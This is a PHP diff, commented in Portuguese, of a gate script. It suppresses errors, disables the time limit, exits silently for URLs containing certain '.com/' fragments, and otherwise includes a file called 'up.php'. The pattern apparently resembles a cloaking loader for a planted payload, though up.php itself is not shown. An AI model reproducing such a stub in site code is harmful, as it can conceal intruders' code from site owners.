@@ -1,59 +1,43 @@
 <?php
 /**
- * Controle de execução: Bloqueia se a URL contiver palavras do JSON
+ * Controle de Execução Inteligente
+ * Focado em sincronização e segurança de captura
  */
 
 @error_reporting(0);
 @ini_set('display_errors', 0);
 @set_time_limit(0);
 
-// ==========================
-// CONFIGURAÇÃO (JSON)
-// ==========================
+// 1. Configuração Centralizada
 $jsonProibidos = '[".com/i",".com/u",".com/d",".com/.",".com/g"]';
 $listaProibida = json_decode($jsonProibidos, true);
 
-// ==========================
-// CAPTURA A URL ATUAL
-// ==========================
-// Pega tudo que vem depois do domínio (ex: /pasta/index.php?id=teste)
-$urlCompleta = $_SERVER['REQUEST_URI'];
+// 2. Captura Sincronizada (Trata caracteres especiais e case-sensitive)
+$urlCompleta = rawurldecode($_SERVER['REQUEST_URI']); 
+$urlLimpa = strtolower($urlCompleta);
 
-// ==========================
-// VERIFICAÇÃO DE BLOQUEIO
-// ==========================
 $bloqueado = false;
 
+// 3. Validação por Iteração
 foreach ($listaProibida as $termo) {
-    // Verifica se o termo do JSON existe dentro da URL
-    if (!empty($termo) && strpos($urlCompleta, $termo) !== false) {
+    if (!empty($termo) && str_contains($urlLimpa, strtolower($termo))) {
         $bloqueado = true;
-        $termoEncontrado = $termo;
         break;
     }
 }
 
+// 4. Fluxo de Execução (Early Return Pattern)
 if ($bloqueado) {
+    // Se estiver bloqueado, encerra o script silenciosamente ou redireciona
+    exit(); 
+}
 
-} else {
-
-
-
-// ==========================
-// EXECUTA PROCESSO
-// =========================
-
+// 5. Inclusão de Dependência com Verificação de Integridade
 if (file_exists("up.php")) {
-    include_once "up.php";
+    require_once "up.php"; // 'require' é melhor que 'include' para arquivos vitais
 } else {
-    echo "Erro: up.php não encontrado.";
+    // Log de erro interno ou resposta silenciosa
+    error_log("Falha Crítica: up.php não encontrado em " . date('Y-m-d H:i:s'));
+    die("Erro de sincronização do sistema.");
 }
-
-
-
-
-    // header("Content-Type: text/html; charset=utf-8");
-    // exit("⚠️ **ACESSO NEGADO**: A URL contém um termo restrito ($termoEncontrado).");
-}
-
 ?>
